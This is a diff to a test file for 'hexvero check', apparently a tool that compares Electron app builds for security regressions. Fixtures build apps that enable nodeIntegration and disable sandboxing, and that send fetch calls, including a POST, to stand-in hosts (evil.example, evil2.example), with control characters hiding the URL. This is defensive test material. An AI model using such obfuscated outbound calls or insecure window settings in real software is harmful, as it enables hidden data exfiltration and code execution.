@@ -1,4 +1,4 @@
-import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
@@ -51,6 +51,8 @@ const evil = (v2: boolean) => ({
   ].join("\n"),
 });
 
+const windowApp = (name: string, open: boolean) =>
+  `const { BrowserWindow, app } = require("electron");\napp.whenReady().then(() => { const ${name} = new BrowserWindow({ webPreferences: { nodeIntegration: ${open}, contextIsolation: ${!open}, sandbox: ${!open} } }); ${name}.loadURL("app://index.html"); });\n`;
 describe("hexvero check", () => {
   const dir = mkdtempSync(join(tmpdir(), "hexvero-check-"));
   const a = join(dir, "demo", "notesdesk-1.4.0.asar");
@@ -249,5 +251,61 @@ describe("hexvero check", () => {
     const prose = md.replace(/`` .*? ``/g, "").replace(/`[^`\n]*`/g, "");
     expect(prose).not.toMatch(/(?<!\\)<(img|script)/);
     expect(existsSync(join(dir, "evil-2.asar"))).toBe(true);
+  });
+
+  /** An app directory with these files, as the reviewer's fixtures were. */
+  const appDir = (name: string, files: Record<string, string>): string => {
+    const path = join(dir, name);
+    mkdirSync(path, { recursive: true });
+    writeFileSync(join(path, "package.json"), '{"name":"x","version":"1.0.0","main":"main.js"}');
+    for (const [file, text] of Object.entries(files)) writeFileSync(join(path, file), text);
+    return path;
+  };
+  const emptyPolicy = (): string => {
+    const path = join(dir, "p-empty.json");
+    writeFileSync(path, '{"hexvero":"policy","version":1,"rules":{}}');
+    return path;
+  };
+
+  it("review H3: a window renamed while turning permissive fails (exit 3) with file:line", async () => {
+    const before = appDir("wA", { "main.js": windowApp("win", false) });
+    const after = appDir("wB", { "main.js": windowApp("mainWindow", true) });
+    const r = await check(before, after, "--policy", emptyPolicy());
+    expect(r.code).toBe(3);
+    expect(r.io.text()).toContain(
+      "window-more-permissive  main.js::mainWindow nodeIntegrationInEffect",
+    );
+    expect(r.io.text()).toContain("@ b: main.js:2");
+  });
+
+  it("review H4: a target that is not a JavaScript application is an error (exit 1), never a pass", async () => {
+    for (const other of ["README.md", "policy.json", "notesdesk-1.5.0.bundle.js"]) {
+      const r = await check(a, join(root, "examples", other), "--policy", examplePolicy);
+      expect(r.code, other).toBe(1);
+      expect(r.io.stderr.join("\n"), other).toMatch(/hexvero check compares two builds/);
+    }
+  });
+
+  it("review L2: a URL with control characters still names its host (exit 3)", async () => {
+    // Real U+0001 and TAB characters inside the literals: fetch strips them as WHATWG URL does.
+    // (Escape sequences such as "\\u0001" in the source are a matter of the tokenizer.)
+    const before = appDir("hA", { "main.js": 'const { app } = require("electron");\n' });
+    const after = appDir("hB", {
+      "main.js":
+        'const { app } = require("electron");\nfetch("\u0001https://evil.example/x", { method: "POST" });\nfetch("ht\ttps://evil2.example/x");\n',
+    });
+    const r = await check(before, after, "--policy", emptyPolicy(), "--json");
+    const result = JSON.parse(r.io.stdout.join("\n"));
+    expect(result.findings.map((f: { key: string }) => f.key)).toEqual(
+      expect.arrayContaining(["evil.example", "evil2.example"]),
+    );
+    expect(r.code).toBe(3);
+  });
+
+  it("review L6: a baseline written for another policy or before build is reported", async () => {
+    const baseline = join(dir, "l6-baseline.json");
+    await check(a, b, "--policy", examplePolicy, "--baseline", baseline, "--update-baseline");
+    const r = await check(b, b, "--policy", examplePolicy, "--baseline", baseline);
+    expect(r.io.text()).toContain("the baseline was written against another before build");
   });
 });
